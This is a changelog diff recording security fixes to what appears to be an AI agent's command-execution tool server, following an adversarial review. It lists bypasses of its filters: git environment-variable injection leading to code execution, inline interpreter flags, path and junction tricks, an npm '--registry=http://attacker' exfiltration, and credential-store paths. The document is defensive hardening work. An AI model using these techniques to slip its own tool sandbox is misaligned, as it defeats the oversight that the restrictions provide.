@@ -6,6 +6,78 @@ The format loosely follows [Keep a Changelog](https://keepachangelog.com/en/1.1.
 
 ---
 
+## [1.6.0] — 2026-04-18
+
+### Security hardening — third-pass Opus adversarial review (S48)
+
+Closes all 5 CRITICAL and all 8 HIGH findings from the third-pass adversarial review. Previous verdict: FAIL.
+
+**F-LT-1 (CRITICAL): GIT_PAGER env var bypasses `core.pager=cat` neutralizer → RCE**
+- `buildSafeGitEnv(dir)` introduced, replacing the inline `safeGitEnv` object. Forces `GIT_PAGER=cat` and `PAGER=cat` in the child env — these outrank any `-c core.pager=cat` config flag. Belt-and-suspenders with `--no-pager` flag on every git invocation.
+
+**F-LT-2 (CRITICAL): GIT_EXTERNAL_DIFF env var bypasses `diff.external=` neutralizer → RCE**
+- `buildSafeGitEnv()` explicitly deletes `GIT_EXTERNAL_DIFF` and `GIT_DIFF_OPTS` from the child env.
+- `--no-ext-diff` flag added to every git invocation at the argv level.
+
+**F-LT-3 (CRITICAL): GIT_CONFIG_COUNT / GIT_CONFIG_KEY_N / GIT_CONFIG_VALUE_N injection**
+- `buildSafeGitEnv()` deletes `GIT_CONFIG_COUNT`, `GIT_CONFIG_PARAMETERS`, and all keys starting with `GIT_CONFIG_KEY_` or `GIT_CONFIG_VALUE_` via prefix scan of the env.
+
+**F-LT-4 (CRITICAL): `git show <commit_sha>` leaks file contents via bare-ref commit diff**
+- Pre-flight check added in `run_git_command` for `git show`: runs `git show --name-only --no-patch --pretty=format:` to retrieve touched file names, then rejects the call if any path matches `SENSITIVE_FILE_PATTERNS`. The `ref:path` form was already blocked in `validateGitArgv`; this closes the bare `<sha>` form.
+
+**F-LT-5 (CRITICAL): `node -p` / `--print` bypasses `-e`/`--eval` block**
+- Added RED patterns for `node -e/-p`, `node --eval/--print`, `node --require/-r`, `node --import`, and `node --inspect`.
+
+**F-LT-6 (HIGH): UNC via forward slashes `//server/share` bypasses UNC reject**
+- `sanitizeDir()`, `list_directory`, and `read_file` now reject `//` prefix in addition to the existing `\\` check.
+
+**F-LT-7 (HIGH): NTFS junction points bypass symlink check in `find_files`**
+- `find_files` walker now calls `realpathSync(full)` on every directory entry; if the canonical path differs from the nominal path, the entry is a reparse point (junction) and is skipped.
+
+**F-LT-8 (HIGH): `git show/log/diff -- <path>` pathspec bypasses sensitive check**
+- `validateGitArgv()` now scans all tokens after `--` against `SENSITIVE_FILE_PATTERNS`. Closes the pathspec form `git log --all -- '*.env'` and `git show <sha> -- config/.env`.
+
+**F-LT-9 (HIGH): `python -m`, `ruby -e`, `php -r`, `perl -E`, `deno eval` not blocked**
+- Added RED patterns for all these interpreter inline-exec forms.
+
+**F-LT-10 (HIGH): `git -C <path>` CWD escape + hooksPath/diff-driver not neutralized**
+- `-C`, `--work-tree`, `--git-dir`, `--super-prefix`, `--namespace` added to `FORBIDDEN_GIT_FLAGS`.
+- `core.hooksPath=NUL` (Windows) / `core.hooksPath=/dev/null` (POSIX) added to `GIT_SAFE_CONFIG`.
+- `--no-ext-diff` added to every git invocation.
+
+**F-LT-11 (HIGH): NTFS hardlink bypasses realpath sensitive check in `read_file`**
+- After canonical-path resolution, if `stat.nlink > 1` on Windows, `fsutil hardlink list` enumerates all linked paths; access is blocked if any linked path matches `SENSITIVE_FILE_PATTERNS`.
+
+**F-LT-12 (HIGH): GIT_DIR / GIT_OBJECT_DIRECTORY / GIT_WORK_TREE env inheritance**
+- `buildSafeGitEnv()` deletes `GIT_DIR`, `GIT_WORK_TREE`, `GIT_OBJECT_DIRECTORY`, and `GIT_ALTERNATE_OBJECT_DIRECTORIES` from the child env.
+
+**F-LT-13 (HIGH): Token stores not in SENSITIVE_FILE_PATTERNS**
+- Added: Slack/Discord Local Storage, Chrome Login Data/Cookies, Firefox Profiles, Windows Credential Manager Vault, VS Code globalStorage.
+
+**F-LT-14 (MEDIUM): `node --inspect=0.0.0.0:9229` remote debugger**
+- Blocked by the F-LT-5 `node --inspect` RED pattern.
+
+**F-LT-15 (MEDIUM): LOLBAS gaps — forfiles, finger, diskshadow, mmc**
+- `forfiles` promoted from AMBER to RED.
+- `finger`, `diskshadow`, `mmc.exe` added to RED.
+
+**F-LT-16 (MEDIUM): `git log --walk-reflogs` exposes deleted/orphan refs**
+- `--walk-reflogs` and `--reflog` added to `FORBIDDEN_GIT_FLAGS`.
+
+**F-LT-17 (MEDIUM): `npm audit --registry=http://attacker` dep-graph exfil**
+- `run_npm_command` now rejects `--registry=`, `--cafile=`, `--proxy=`, `--https-proxy=` flags.
+
+**F-LT-18 (MEDIUM): `git log --pretty=format:%x1b…` terminal escape injection**
+- Git output is now post-processed to strip ANSI/VT escape sequences before returning.
+
+**F-LT-21 (LOW): `git diff --binary` binary-blob leak**
+- `--binary` added to `FORBIDDEN_GIT_FLAGS`.
+
+**Other:**
+- `.env` regex in `SENSITIVE_FILE_PATTERNS` tightened: `/\.env($|\.)/i` → `/\.env(?![a-zA-Z0-9])/i` (mirrors vps-control-mcp F-OP-5 fix).
+
+---
+
 ## [1.5.0] — 2026-04-18
 
 ### Security hardening — second-pass Opus adversarial review (S45)
